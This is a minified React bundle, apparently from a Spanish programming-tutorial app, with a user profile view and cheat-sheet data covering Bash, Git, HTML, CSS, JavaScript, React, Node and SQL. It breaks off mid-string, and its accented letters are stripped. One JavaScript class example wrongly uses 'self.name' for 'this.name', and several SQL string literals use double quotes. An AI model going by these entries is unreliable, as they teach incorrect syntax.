g.jsxs("div",{className:"profile-container",children:[g.jsx("div",{className:"profile-header-section",children:g.jsxs("div",{className:"profile-user-card",children:[g.jsxs("div",{className:"profile-avatar",children:[g.jsx("div",{className:"profile-avatar-wrapper",children:g.jsx("div",{className:"profile-avatar-inner",children:a?.photoURL?g.jsx("img",{src:a.photoURL,alt:"Avatar"}):g.jsx(nj,{size:80,color:"var(--text-muted)"})})}),g.jsx("div",{className:"level-badge",children:d})]}),g.jsxs("div",{className:"profile-user-info",children:[g.jsx("h1",{children:a?.displayName||"Desarrollador"}),g.jsx("span",{className:"profile-email",children:a?.email}),g.jsxs("div",{className:"xp-bar-container",children:[g.jsxs("div",{className:"xp-info",children:[g.jsxs("span",{children:["Nivel ",d]}),g.jsxs("span",{children:[t," / ",f," XP"]})]}),g.jsx("div",{className:"xp-bar-bg",children:g.jsx("div",{className:"xp-bar-fill",style:{width:`${v}%`}})})]})]})]})}),g.jsxs("div",{className:"stats-grid",children:[g.jsxs("div",{className:"stat-card",children:[g.jsx(mN,{className:"stat-icon"}),g.jsxs("div",{className:"stat-content",children:[g.jsx("h3",{children:y.length}),g.jsx("p",{children:"Lecciones Fav"})]})]}),g.jsxs("div",{className:"stat-card",children:[g.jsx(Bg,{className:"stat-icon"}),g.jsxs("div",{className:"stat-content",children:[g.jsx("h3",{children:l.length}),g.jsx("p",{children:"Libs favoritas"})]})]}),g.jsxs("div",{className:"stat-card",children:[g.jsx(W1,{className:"stat-icon"}),g.jsxs("div",{className:"stat-content",children:[g.jsx("h3",{children:A.length}),g.jsx("p",{children:"Mdulos Listos"})]})]})]}),g.jsxs("div",{className:"profile-grid",children:[g.jsxs("div",{className:"profile-section lib-fav-section",children:[g.jsxs("h2",{className:"section-title",children:[g.jsx(CN,{})," Bibliotecas Guardadas"]}),g.jsx("div",{className:"profile-fav-libs",children:S.length>0?S.map(x=>g.jsxs("div",{className:"fav-lib-item",onClick:()=>L(x.id),style:{cursor:"pointer"},title:"Ver detalles e instalacin",children:[g.jsx("div",{className:"fav-lib-icon",children:R(x.icon,20)}),g.jsx("span",{children:x.name}),g.jsx(zg,{style:{marginLeft:"auto",opacity:.5}})]},x.id)):g.jsx("div",{className:"empty-state",children:"No tienes bibliotecas favoritas an."})})]}),g.jsxs("div",{className:"profile-section modules-section",children:[g.jsxs("h2",{className:"section-title",children:[g.jsx(Br,{})," Mdulos Completados"]}),g.jsx("div",{className:"completed-modules-list",children:A.length>0?A.map(x=>g.jsxs("div",{className:"module-complete-card",children:[g.jsx("div",{className:"module-icon-box",children:g.jsx(W1,{size:24})}),g.jsxs("div",{className:"module-details",children:[g.jsx("h4",{children:x.title}),g.jsxs("span",{children:[x.lessons.length," Lecciones"]})]})]},x.id)):g.jsx("div",{className:"empty-state",children:"An no has completado ningn mdulo al 100%."})})]}),g.jsxs("div",{className:"profile-section lessons-section",children:[g.jsxs("h2",{className:"section-title",children:[g.jsx(Bg,{})," Lecciones Destacadas"]}),g.jsx("div",{className:"fav-lessons-list",children:y.length>0?y.map(([x,D])=>g.jsxs("div",{className:"fav-lesson-card",onClick:()=>e(`/learn/${D.moduleId}?lesson=${x}`),style:{cursor:"pointer"},title:"Ir a la leccin",children:[g.jsxs("div",{className:"lesson-info",children:[g.jsx("h4",{children:D.lessonTitle}),g.jsx("span",{children:D.moduleTitle})]}),g.jsx(zg,{size:20,color:"var(--primary)"})]},x)):g.jsx("div",{className:"empty-state",children:"No hay lecciones marcadas como favoritas."})})]})]})]})},g5={id:"prog-bases",title:"Bases de Programacin",icon:"",description:"Fundamentos universales de lgica y algoritmos.",sections:[{name:"Variables y Tipos",items:[{label:"String",value:"\"Texto\", 'Ms texto', `Template`"},{label:"Number",value:"10 (Integer), 10.5 (Float), NaN"},{label:"Boolean",value:"true (verdadero), false (falso)"},{label:"Colecciones",value:"[1,2,3] (Array/List), {key: val} (Object/Map)"}]},{name:"Control de Flujo",items:[{label:"If/Else",value:"if (cond) { ... } else if { ... } else { ... }"},{label:"Switch",value:"switch(val) { case x: ... break; default: ... }"},{label:"Ternario",value:"condicin ? si_verdadero : si_falso"}]},{name:"Bucles (Loops)",items:[{label:"For",value:"for (let i = 0; i < n; i++) { ... }"},{label:"While",value:"while (condicin) { ... }"},{label:"For Each",value:"array.forEach(item => { ... });"}]},{name:"Operadores",items:[{label:"Lgicos",value:"&& (AND), || (OR), ! (NOT)"},{label:"Aritmticos",value:"+, -, *, /, % (mdulo), ++, --"},{label:"Comparar",value:"== (valor), === (valor+tipo), !=, !==, <, >"}]}]},b5={id:"bash",title:"Bash & Terminal",icon:"",description:"Control manual del sistema y automatizacin.",sections:[{name:"Navegacin",items:[{label:"Dnde",value:"pwd (ubicacin), ls (listar), ls -la (detallado)"},{label:"Ir",value:"cd <dir>, cd .. (atrs), cd ~ (home), cd - (previo)"}]},{name:"Gestin Archivos",items:[{label:"Crear",value:"touch <file> (archivo), mkdir <dir> (carpeta)"},{label:"Ver",value:"cat <file> (todo), head (inicio), tail -f (seguimiento)"},{label:"Mover",value:"mv <src> <dest> (mover/renombrar), cp -r (copiar carpeta)"},{label:"Borrar",value:"rm <file>, rm -rf <dir> (recursivo y forzado)"}]},{name:"Permisos & Sistema",items:[{label:"Permisos",value:"chmod +x <file> (ejecutable), chown user:group"},{label:"Procesos",value:"top | htop (ver carga), kill -9 <pid> (matar)"},{label:"Red",value:"curl <url>, ping <host>, ip addr (ver IP)"}]},{name:"Trucos",items:[{label:"History",value:"history (comandos previos), ctrl+r (buscar)"},{label:"Alias",value:'alias ll="ls -la" (atajo temporal)'},{label:"Pipe",value:'ls | grep "txt" (enviar salida a otro comando)'}]}]},v5={id:"git",title:"Git & GitHub",icon:"",description:"Control de versiones y flujo de trabajo profesional.",sections:[{name:"Workflow Bsico",items:[{label:"Init",value:"git init (inicia repo); git clone <url> (descarga)"},{label:"Snapshot",value:'git add . -> git commit -m "mensaje"'},{label:"Sync",value:"git pull (traer cambios); git push (subir)"},{label:"Status",value:"git status (estado); git log --oneline (historial)"}]},{name:"Ramas (Branches)",items:[{label:"Listar/Crear",value:"git branch (ver); git branch <name> (crear)"},{label:"Switch",value:"git checkout <name> o git switch <name>"},{label:"Fusionar",value:"git merge <name> (trae cambios a rama actual)"},{label:"Borrar",value:"git branch -d <name> (local); -D (forzar)"}]},{name:"Deshacer Cambios",items:[{label:"Stage",value:"git restore --staged <file> (quitar del add)"},{label:"Discard",value:"git restore <file> (borrar cambios locales)"},{label:"Reset",value:"git reset --hard HEAD~1 (borra ultimo commit)"},{label:"Revert",value:"git revert <commit-id> (crea commit inverso)"}]},{name:"Utilidades Avanzadas",items:[{label:"Stash",value:"git stash (guardar); git stash pop (recuperar)"},{label:"Diff",value:"git diff (ver cambios); git show <id> (ver commit)"},{label:"Remotes",value:"git remote -v; git remote add origin <url>"}]}]},y5={id:"html",title:"HTML5",icon:"",description:"Estructura semntica, multimedia y formularios web.",sections:[{name:"Boilerplate & Meta",items:[{label:"Doctype",value:"<!DOCTYPE html>"},{label:"Viewport",value:'<meta name="viewport" content="width=device-width, initial-scale=1.0">'},{label:"CharSet",value:'<meta charset="UTF-8">'},{label:"Favicon",value:'<link rel="icon" href="favicon.ico">'}]},{name:"Estructura Semntica",items:[{label:"Encabezado",value:"<header>...</header>"},{label:"Navegacin",value:"<nav>...</nav>"},{label:"Contenido",value:"<main> <section> <article> <aside>"},{label:"Pie",value:"<footer>...</footer>"},{label:"Detalles",value:"<details><summary>Click aqu</summary>...</details>"}]},{name:"Texto y Listas",items:[{label:"Ttulos",value:"<h1> hasta <h6>"},{label:"Prrafo",value:"<p>Este es un texto</p>"},{label:"nfasis",value:"<strong> (bold), <em> (italic)"},{label:"Listas",value:"<ul><li> (desordenada), <ol><li> (ordenada), <dl><dt><dd> (descripcin)"}]},{name:"Multimedia y Enlaces",items:[{label:"Imagen",value:'<img src="url" alt="descripcin" loading="lazy">'},{label:"Enlace",value:'<a href="url" target="_blank" rel="noopener">Link</a>'},{label:"Video",value:'<video controls poster="img.jpg"><source src="v.mp4"></video>'},{label:"Audio",value:'<audio controls src="a.mp3"></audio>'}]},{name:"Formularios Avanzados",items:[{label:"Estructura",value:'<form action="/api" method="POST"><fieldset><legend>Datos</legend>'},{label:"Inputs",value:"text, password, email, number, date, range, color, file"},{label:"Seleccin",value:'<select><option>, <input type="radio|checkbox">'},{label:"Botones",value:'<button type="submit|reset|button">'},{label:"Datalist",value:'<input list="browsers"><datalist id="browsers">...'}]},{name:"Tablas",items:[{label:"Bsico",value:"<table><thead><tr><th>...<tbody><tr><td>"},{label:"Caption",value:"<caption>Ttulo de la tabla</caption>"},{label:"Combinar",value:'<td colspan="2"> (columnas), <td rowspan="2"> (filas)'}]}]},E5={id:"css",title:"CSS3",icon:"",description:"Estilos, layouts modernos y diseo responsivo.",sections:[{name:"Selectores y Especificidad",items:[{label:"Bsicos",value:"* (todos), tag, .clase, #id"},{label:"Combinadores",value:"div p (descendiente), div > p (hijo), div + p (adyacente)"},{label:"Pseudo-clases",value:":hover, :focus, :nth-child(n), :not(), :checked"},{label:"Pseudo-elems",value:'::before, ::after (requieren content: "")'}]},{name:"Box Model & Unidades",items:[{label:"Modelo",value:"margin > border > padding > content"},{label:"Sizing",value:"box-sizing: border-box; (incluye padding en width)"},{label:"Absolutas",value:"px, pt, cm"},{label:"Relativas",value:"rem (root em), em (parent), %, vh, vw"}]},{name:"Flexbox (Contenedor)",items:[{label:"Display",value:"display: flex | inline-flex"},{label:"Direccin",value:"flex-direction: row | column | row-reverse"},{label:"Alineacin",value:"justify-content (eje principal), align-items (eje cruzado)"},{label:"Envolver",value:"flex-wrap: wrap | nowrap"},{label:"Gap",value:"gap: 20px; (espacio entre celdas)"}]},{name:"CSS Grid",items:[{label:"Grid",value:"display: grid; grid-template-columns: repeat(3, 1fr);"},{label:"reas",value:'grid-template-areas: "h h" "s m";'},{label:"Posicin",value:"grid-column: 1 / 3; grid-row: 2;"}]},{name:"Posicionamiento",items:[{label:"Tipos",value:"static, relative, absolute (parent rel), fixed, sticky"},{label:"Z-Index",value:"z-index: 10; (requiere posicin != static)"},{label:"Centrado Abs",value:"top: 50%; left: 50%; transform: translate(-50%, -50%);"}]},{name:"Filtros y Transiciones",items:[{label:"Filtros",value:"filter: blur(5px) grayscale(1) drop-shadow(...)"},{label:"Transicin",value:"transition: all 0.3s ease-in-out;"},{label:"Animacin",value:"animation: name duration infinite; @keyframes name {...}"}]},{name:"Centrado (Cheat Codes)",items:[{label:"Flexbox",value:"display: flex; justify-content: center; align-items: center;"},{label:"Grid",value:"display: grid; place-items: center;"},{label:"Margin Auto",value:"margin: 0 auto; (solo horizontal, requiere width)"},{label:"Text Align",value:"text-align: center; (para texto e inline-block)"},{label:"Absoluto",value:"position: absolute; top: 50%; left: 50%; transform: translate(-50%, -50%);"}]},{name:"Botones & UI",items:[{label:"Base",value:"border: none; outline: none; cursor: pointer; padding: 0.8rem 1.5rem;"},{label:"Glassmorphism",value:"background: rgba(255, 255, 255, 0.1); backdrop-filter: blur(10px);"},{label:"Sombras",value:"box-shadow: 0 4px 6px -1px rgb(0 0 0 / 0.1), 0 2px 4px -2px rgb(0 0 0 / 0.1);"},{label:"Gradiente",value:"background: linear-gradient(135deg, #646cff 0%, #7b2ff7 100%);"}]},{name:"Media Queries",items:[{label:"Mobile First",value:"@media (min-width: 768px) { ... }"},{label:"Desktop First",value:"@media (max-width: 1024px) { ... }"},{label:"Orientacin",value:"@media (orientation: landscape) { ... }"},{label:"Prefer Dark",value:"@media (prefers-color-scheme: dark) { ... }"}]}]},S5={id:"tailwind",title:"Tailwind CSS",icon:"",description:"Framework CSS de utilidades para un desarrollo veloz y consistente.",sections:[{name:"Layout & Box Model",items:[{label:"Display",value:"flex, grid, block, inline-block, hidden, contents"},{label:"Position",value:"relative, absolute, fixed, sticky, inset-0, z-50"},{label:"Size",value:"w-full, h-screen, max-w-7xl, min-h-[500px]"},{label:"Spacing",value:"p-4 (padding), m-2 (margin), -m-4 (negativo), space-x-4"},{label:"Overflow",value:"overflow-hidden, overflow-y-auto, overflow-x-scroll"}]},{name:"Flexbox & Grid",items:[{label:"Flex",value:"flex-row, flex-col, justify-between, items-center, gap-4"},{label:"Flex Item",value:"grow, shrink, basis-0, order-first, flex-1"},{label:"Grid",value:"grid-cols-12, col-span-4, grid-rows-3, gap-x-8"},{label:"Place",value:"place-items-center, place-content-center"}]},{name:"Tipografa",items:[{label:"Size/Weight",value:"text-sm, text-4xl, font-light, font-bold, italic"},{label:"Alignment",value:"text-left, text-center, text-justify"},{label:"Style",value:"uppercase, capitalize, underline, antialiased"},{label:"Letter/Line",value:"tracking-tighter, leading-tight, whitespace-nowrap"}]},{name:"Bordes & Efectos",items:[{label:"Border",value:"border, border-2, border-b, border-dashed"},{label:"Radius",value:"rounded-sm, rounded-lg, rounded-full, rounded-tr-none"},{label:"Shadows",value:"shadow-sm, shadow-xl, shadow-inner, shadow-blue-500/50"},{label:"Opacity",value:"opacity-0, opacity-50, opacity-100"},{label:"Filters",value:"blur-md, brightness-125, drop-shadow-lg"}]},{name:"Interactividad & Estados",items:[{label:"Pseudo",value:"hover:bg-blue, focus:ring-2, active:scale-95"},{label:"Group/Peer",value:"group-hover:opacity-100, peer-checked:block"},{label:"Responsive",value:"sm:p-2, md:p-6, lg:grid-cols-3, xl:max-w-screen-2xl"},{label:"Dark Mode",value:"dark:bg-slate-900, dark:text-white"}]},{name:"Transiciones & Animaciones",items:[{label:"Transition",value:"transition-all, duration-500, ease-in-out, delay-150"},{label:"Animate",value:"animate-spin (giro), animate-pulse (latido), animate-bounce"}]},{name:"Mezcla & Clipping",items:[{label:"Mix Blend",value:"mix-blend-overlay, mix-blend-multiply"},{label:"Gradients",value:"bg-gradient-to-r, from-blue-500, to-teal-400"}]}]},C5={id:"javascript",title:"JavaScript",icon:"JS",description:"Lgica embebida en la web, interactividad y backend.",sections:[{name:"Variables y Tipos",items:[{label:"Declaracin",value:"const (constante), let (variable de bloque), var (legacy)"},{label:"Primitivos",value:"String, Number, Boolean, Null, Undefined, Symbol"},{label:"Template Str",value:"`Hola ${nombre}` (literales de plantilla)"}]},{name:"Funciones ES6+",items:[{label:"Arrow Fn",value:"const add = (a, b) => a + b;"},{label:"Parmetros",value:'function greet(name = "User") { ... }'},{label:"IIFE",value:"(function() { ... })(); (ejecucin inmediata)"}]},{name:"Arrays (Comunes)",items:[{label:"Transformar",value:".map(x => x * 2), .filter(x => x > 0)"},{label:"Acumular",value:".reduce((acc, curr) => acc + curr, 0)"},{label:"Buscar",value:".find(x => x.id === 1), .findIndex(...), .includes(val)"},{label:"Mutar",value:".push() (fin), .pop() (fin), .shift() (inicio), .unshift() (inicio)"}]},{name:"Objetos",items:[{label:"Destructuring",value:"const { name, age } = user; (extraer propiedades)"},{label:"Spread",value:"const copy = { ...oldObj, newProp: 1 };"},{label:"Optional Ch",value:"user?.profile?.name (evita errores si es null)"},{label:"Entries",value:"Object.keys(obj), Object.values(obj), Object.entries(obj)"}]},{name:"Asincrona",items:[{label:"Promises",value:"new Promise((res, rej) => ...); .then().catch().finally()"},{label:"Async/Await",value:"async function fetch() { const res = await data; }"},{label:"Fetch API",value:"fetch(url).then(r => r.json()).then(data => ...)"}]},{name:"Manipulacin del DOM",items:[{label:"Selectores",value:'document.querySelector("#id"), .querySelectorAll(".class")'},{label:"Eventos",value:'el.addEventListener("click", (e) => ...)'},{label:"Clases",value:'el.classList.add("btn"), .remove(), .toggle("active")'},{label:"Estilos",value:'el.style.backgroundColor = "red";'}]},{name:"Control de Errores",items:[{label:"Try/Catch",value:"try { ... } catch (err) { ... } finally { ... }"},{label:"Throw",value:'throw new Error("Algo sali mal");'}]},{name:"Almacenamiento (Web API)",items:[{label:"Local Storage",value:'localStorage.setItem("k", "v"); localStorage.getItem("k");'},{label:"Session Storage",value:'sessionStorage.setItem("k", "v"); (se borra al cerrar)'},{label:"JSON",value:"JSON.stringify(obj); (obj a string); JSON.parse(str); (string a obj)"}]},{name:"Mdulos (ESM)",items:[{label:"Export",value:"export const myVar = 1; export default MyComponent;"},{label:"Import",value:'import { myVar } from "./file"; import React from "react";'},{label:"Dinmico",value:'import("./file").then(module => ...);'}]},{name:"Clases (OOP)",items:[{label:"Base",value:"class Player { constructor(n) { self.name = n } }"},{label:"Herencia",value:"class Archer extends Player { shoot() { ... } }"},{label:"Privados",value:"#secretProperty = 10; (solo accesible dentro)"}]},{name:"Trucos de Lgica",items:[{label:"Short Circuit",value:"const x = a || b; (si a es falsy, toma b)"},{label:"Nullish",value:"const x = a ?? b; (si a es null/undefined, toma b)"},{label:"Boolean",value:"!!value; (convierte cualquier cosa a boolean)"}]},{name:"Control de Tiempo",items:[{label:"Timeout",value:"setTimeout(() => { ... }, 1000); (ejecuta una vez)"},{label:"Interval",value:"setInterval(() => { ... }, 1000); (ejecuta n veces)"},{label:"Borrar",value:"clearTimeout(id); clearInterval(id);"}]},{name:"Consola & Depuracin",items:[{label:"Log",value:"console.log(); console.warn(); console.error();"},{label:"Data",value:"console.table(arr); (muestra datos en tabla)"},{label:"Tiempo",value:'console.time("label"); console.timeEnd("label");'}]}]},A5={id:"typescript",title:"TypeScript",icon:"TS",description:"JavaScript con superpoderes de tipado esttico.",sections:[{name:"Tipos Bsicos",items:[{label:"Primitivos",value:"string, number, boolean, symbol, bigint, void, never"},{label:"Especiales",value:"any (ignorar tipado), unknown (seguro), null, undefined"},{label:"Arrays",value:"number[], Array<string>, [number, string] (tupla)"}]},{name:"Interfaces & Types",items:[{label:"Interface",value:"interface User { id: number; name: string; }"},{label:"Type Alias",value:"type Point = { x: number; y: number; };"},{label:"Extendiendo",value:"interface Admin extends User { role: string; }"},{label:"Opcionales",value:'name?: string; (la "?" indica opcional)'},{label:"Readonly",value:"readonly id: number; (no modificable)"}]},{name:"Tipos de Unin e Interseccin",items:[{label:"Unin",value:"type ID = string | number; (puede ser uno u otro)"},{label:"Interseccin",value:"type Person = User & { age: number }; (combina ambos)"},{label:"Literales",value:'type Role = "admin" | "user" | "guest";'}]},{name:"Funciones",items:[{label:"Tipado Fn",value:"(a: number, b: number): number => a + b"},{label:"Retorno Void",value:'function log(): void { console.log("Hi"); }'},{label:"Optional Param",value:"function (a: number, b?: number) { ... }"}]},{name:"Genricos",items:[{label:"Bsico",value:"function identity<T>(arg: T): T { return arg; }"},{label:"Interface Gen",value:"interface Response<T> { data: T; status: number; }"},{label:"Constraints",value:"function log<T extends { len: number }>(arg: T) { ... }"}]},{name:"Utility Types (Fundamentales)",items:[{label:"Partial<T>",value:"Convierte todas las propiedades en opcionales."},{label:"Pick<T, K>",value:"Selecciona solo un conjunto de propiedades K de T."},{label:"Omit<T, K>",value:"Elimina las propiedades K del tipo T."},{label:"Readonly<T>",value:"Hace que todas las propiedades sean de solo lectura."},{label:"Record<K, T>",value:"Crea un objeto con llaves K y valores T."}]},{name:"Otros",items:[{label:"Enums",value:"enum Direction { Up, Down, Left, Right }"},{label:"Casting",value:"const val = (arg as string).length; o <string>arg"},{label:"Keyof",value:"type Keys = keyof User; (retorna unin de llaves)"},{label:"Typeof",value:"const x = 1; type T = typeof x; (infiere tipo de valor)"}]}]},T5={id:"react",title:"React",icon:"",description:"Biblioteca para construir interfaces declarativas y basadas en componentes.",sections:[{name:"Hooks de Estado & Ciclo de Vida",items:[{label:"useState",value:"const [val, setVal] = useState(init); o setVal(prev => prev + 1)"},{label:"useEffect",value:"useEffect(() => { ... return () => cleanup }, [deps]);"},{label:"useReducer",value:"const [state, dispatch] = useReducer(reducer, initialState);"},{label:"useRef",value:"const inputRef = useRef(null); inputRef.current.focus();"}]},{name:"Memoizacin & Rendimiento",items:[{label:"React.memo",value:"const MyComp = React.memo(({ prop }) => ...); (evita re-renders si props no cambian)"},{label:"useMemo",value:"const result = useMemo(() => expensiveFn(a), [a]); (memoriza valor)"},{label:"useCallback",value:"const fn = useCallback(() => { ... }, [deps]); (memoriza instancia de funcin)"}]},{name:"Context API",items:[{label:"Crear",value:"const MyCtx = createContext(null);"},{label:"Provider",value:"<MyCtx.Provider value={data}>{children}</MyCtx.Provider>"},{label:"Consumir",value:"const data = useContext(MyCtx);"}]},{name:"Estructura & JSX",items:[{label:"Fragments",value:"<> ... </> o <React.Fragment key={id}> ... </React.Fragment>"},{label:"Conditional",value:"{ ok ? <A /> : <B /> } o { ok && <A /> }"},{label:"Lists",value:"map((item, idx) => <li key={item.id}>{item.name}</li>)"},{label:"Portals",value:"createPortal(<Modal />, document.body);"}]},{name:"Custom Hooks",items:[{label:"Definir",value:"function useWindowSize() { ... return size; }"},{label:"Reglas",value:"Solo en el nivel superior. Solo desde funciones de React."}]},{name:"React Router v6+",items:[{label:"Routes",value:'<Routes><Route path="/" element={<Home />}/></Routes>'},{label:"Navigate",value:'const nav = useNavigate(); nav("/login");'},{label:"Params",value:"const { id } = useParams();"},{label:"Query",value:'const [search] = useSearchParams(); search.get("q")'}]},{name:"Formularios & Refs",items:[{label:"Controlado",value:"value={form.name} onChange={e => setForm({...form, name: e.target.value})}"},{label:"Prev Default",value:"const submit = (e) => { e.preventDefault(); ... }"}]},{name:"Patrones Avanzados",items:[{label:"HOC",value:"const withAuth = (Comp) => (props) => { ... return <Comp {...props} /> }"},{label:"Render Props",value:"<Mouse render={pos => <h1>{pos.x}</h1>} />"},{label:"Compound",value:"<Tabs><Tabs.List><Tabs.Tab>... (estado compartido)"}]},{name:"React Testing Library",items:[{label:"Render",value:"render(<MyComp />);"},{label:"Queries",value:'screen.getByText("Hola"); screen.findByRole("button");'},{label:"Events",value:'fireEvent.click(btn); await userEvent.type(input, "txt");'}]}]},x5={id:"state-mgmt",title:"Gestin de Estado",icon:"",description:"Herramientas para manejar el estado global de la aplicacin.",sections:[{name:"Zustand (Recomendado)",items:[{label:"Store",value:"const useStore = create(set => ({ count: 0, inc: () => set(...) }));"},{label:"Uso",value:"const { count, inc } = useStore();"}]},{name:"Redux Toolkit",items:[{label:"Slice",value:"createSlice({ name, initialState, reducers: { ... } });"},{label:"Store",value:"configureStore({ reducer: { root: slice.reducer } });"},{label:"Hooks",value:"useSelector(state => ...); useDispatch();"}]},{name:"React Query (TanStack)",items:[{label:"Query",value:'const { data } = useQuery({ queryKey: ["k"], queryFn: fetcher });'},{label:"Mutation",value:"const { mutate } = useMutation({ mutationFn: poster });"}]}]},j5={id:"nextjs",title:"Next.js",icon:"",description:"Framework avanzado para React con Renderizado Hbrido y App Router.",sections:[{name:"App Router & Routing",items:[{label:"Layouts",value:"layout.tsx (persiste estado, comn a rutas hijas)"},{label:"Pages",value:"page.tsx (IU nica de la ruta)"},{label:"Loading",value:"loading.tsx (IU de carga con Suspense auto)"},{label:"Error",value:"error.tsx (Client component para atrapar errores)"},{label:"Rutas Dinmicas",value:"[slug]/page.tsx -> params.slug"},{label:"Route Handlers",value:"route.ts (API Endpoints: GET, POST, etc.)"}]},{name:"Server vs Client Components",items:[{label:"Server (Default)",value:"Render en servidor, carga menos JS, directo a DB/Secretos."},{label:"Client",value:'"use client"; permite Hooks y Event Listeners (onClick).'},{label:"Cundo usar RSC",value:"Fetching, seguridad, rendimiento base."},{label:"Cundo usar RCC",value:"Interactividad, browser APIs, context."}]},{name:"Data Fetching & Caching",items:[{label:"Server Fetch",value:"await fetch(url); (en Async Server Components)"},{label:"No Caching",value:'fetch(url, { cache: "no-store" });'},{label:"Revalidate (ISR)",value:"fetch(url, { next: { revalidate: 60 } }); (cada minuto)"},{label:"Server Actions",value:'"use server"; export async function fn() { ... }'}]},{name:"SEO & Metadata",items:[{label:"Static",value:'export const metadata = { title: "App" };'},{label:"Dynamic",value:"export async function generateMetadata({ params }) { ... }"},{label:"Favicon/OpenGraph",value:"Pestaas: favicon.ico, opengraph-image.png (File-based)"}]},{name:"Optimizacin",items:[{label:"Images",value:'<Image src={src} priority alt="Alt" /> (Auto WebP/Lazy)'},{label:"Fonts",value:"next/font/google (Cero CLS, descarga fuentes en build)"},{label:"Scripts",value:'<Script src="..." strategy="afterInteractive" />'}]},{name:"Middleware & Edge",items:[{label:"Middleware",value:"middleware.ts (ejecuta antes de render, auth/redirects/i18n)"},{label:"Edge Runtime",value:"Ejecucin ligera y rpida en CDNs cerca del usuario."}]}]},P5={id:"node",title:"Node.js & Express",icon:"",description:"Entorno de ejecucin para JS en el servidor y creacin de APIs robustas.",sections:[{name:"Express Core & Routing",items:[{label:"Inicior",value:"const app = express(); app.listen(port);"},{label:"Mtodos",value:"app.get(), app.post(), app.put(), app.delete(), app.patch()"},{label:"Params",value:"req.params.id (dinmico), req.query (filtros), req.body (data)"},{label:"Respuesta",value:"res.json({ ok: true }), res.status(201).send(), res.redirect()"}]},{name:"Middlewares (Fundamento)",items:[{label:"Estructura",value:"(req, res, next) => { ... next(); }"},{label:"Global",value:"app.use(express.json()); (parseador de body)"},{label:"CORS",value:"app.use(cors()); (habilitar acceso desde otros dominios)"},{label:"Errores",value:"app.use((err, req, res, next) => { ... }); (4 argumentos!)"}]},{name:"Node Native APIs",items:[{label:"FS (File System)",value:"fs.promises.readFile(), fs.writeFileSync()"},{label:"Path",value:'path.join(__dirname, "uploads"), path.resolve()'},{label:"Process",value:"process.env.VAR, process.cwd(), process.exit(1)"},{label:"Crypto",value:'crypto.randomBytes(16).toString("hex")'}]},{name:"Autenticacin & Seguridad",items:[{label:"JWT",value:'jwt.sign({ id }, secret, { expiresIn: "1h" });'},{label:"Bcrypt",value:"await bcrypt.hash(pass, 10); await bcrypt.compare(pass, hash);"},{label:"Helmet",value:"app.use(helmet()); (proteccin de headers HTTP)"},{label:"Limiter",value:"express-rate-limit (evitar ataques brute force)"}]},{name:"Validacin & DB",items:[{label:"Joi/Zod",value:"schema.parse(req.body); (validar tipos y formato)"},{label:"Mongoose",value:'const User = model("User", schema); User.find()'},{label:"Prisma",value:"await prisma.user.create({ data: { ... } });"}]},{name:"Streaming & Events",items:[{label:"Streams",value:"fs.createReadStream().pipe(res); (eficiente con archivos)"},{label:"Events",value:'const emitter = new EventEmitter(); emitter.on("event", fn)'}]},{name:"Herramientas",items:[{label:"Nodemon",value:"Reinicia el servidor al cambiar cdigo (Desarrollo)."},{label:"Dotenv",value:'require("dotenv").config(); (.env -> process.env)'},{label:"PM2",value:"Gestor de procesos en produccin (Cluster, reinicio auto)."}]},{name:"Ecosistema NPM (Populares)",items:[{label:"Utility",value:"lodash (manipulacin), moment/dayjs (fechas), uuid (IDs)"},{label:"HTTP",value:"axios (peticiones), node-fetch, needle"},{label:"Auth",value:"passport (estrategias), jsonwebtoken, bcryptjs"},{label:"Logging",value:"winston (logs), morgan (req logs), pino (rpido)"},{label:"Docs",value:"swagger-ui-express, jsdoc"},{label:"Mailing",value:"nodemailer (enviar correos)"},{label:"Parsing",value:"body-parser (redundante), multer (archivos/multiform)"},{label:"Sockets",value:"socket.io (tiempo real), ws"},{label:"Testing",value:"jest, supertest (probar APIs), mocha, chai"}]}]},q5={id:"sql",title:"SQL",icon:"",description:"Bases de datos relacionales, lenguaje estructurado de consultas y esquemas.",sections:[{name:"DQL (Consultas Avanzadas)",items:[{label:"Select All",value:"SELECT * FROM users;"},{label:"Distinct",value:"SELECT DISTINCT country FROM users; (valores nicos)"},{label:"Where",value:'SELECT * FROM users WHERE age >= 18 AND status = "active";'},{label:"Ordering",value:"SELECT * FROM products ORDER BY price DESC, name ASC;"},{label:"Limit/Offset",value:"SELECT * FROM posts LIMIT 10 OFFSET 20; (paginacin)"},{label:"Like",value:'WHERE name LIKE "Jo%"; (% coincide con cualquier texto)'}]},{name:"Joins (Uniones)",items:[{label:"Inner Join",value:"SELECT * FROM A INNER JOIN B ON A.id = B.a_id; (solo coincidencias)"},{label:"Left Join",value:"SELECT * FROM A LEFT JOIN B ON A.id = B.a_id; (todo A + match B)"},{label:"Right Join",value:"SELECT * FROM A RIGHT JOIN B ON A.id = B.a_id; (todo B + match A)"},{label:"Full Join",value:"SELECT * FROM A FULL OUTER JOIN B ON A.id = B.a_id; (todo A y B)"}]},{name:"Agregacin & Agrupado",items:[{label:"Funciones",value:"COUNT(), SUM(), AVG(), MIN(), MAX()"},{label:"Group By",value:"SELECT category, AVG(price) FROM products GROUP BY category;"},{label:"Having",value:"SELECT city, COUNT(*) FROM users GROUP BY city HAVING COUNT(*) > 5;"}]},{name:"DML (Modificacin de Datos)",items:[{label:"Insert",value:'INSERT INTO users (name, email) VALUES ("Octavio", "o@o.com");'},{label:"Update",value:'UPDATE users SET status = "premium" WHERE id = 5;'},{label:"Upsert",value:"INSERT ... ON CONFLICT (id) DO UPDATE SET ..."},{label:"Delete",value:'DELETE FROM logs WHERE created_at < "2023-01-01";'}]},{name:"DDL (Definicin de Esquema)",items:[{label:"Create Table",value:"CREATE TABLE x (id SERIAL PRIMARY KEY, val TEXT NOT NULL);"},{label:"Alter Table",value:"ALTER TABLE users ADD COLUMN age INT DEFAULT 0;"},{label:"Drop / Truncate",value:"DROP TABLE users; (borra todo) | TRUNCATE x; (solo filas)"},{label:"Indexes",value:"CREATE INDEX idx_user_email ON users(email); (velocidad)"}]},{name:"Constraints (Restricciones)",items:[{label:"Primary Key",value:"Identificador nico de la fila."},{label:"Foreign Key",value:"Vnculo con otra tabla (Integridad referencial)."},{label:"Unique",value:"Asegura que todos los valores en la columna sean distintos."},{label:"Check",value:"CHECK (age >= 18) (valida condiciones al insertar)"}]},{name:"Vistas & Transacciones",items:[{label:"Create View",value:"CREATE VIEW active_users AS SELECT ... (Tabla virtual)"},{label:"Begin",value:"BEGIN; (Inicia una transaccin)"},{label:"Commit",value:"COMMIT; (Guarda cambios permanentemente)"},{label:"Rollback",value:"ROLLBACK; (Revierte cambios si hay 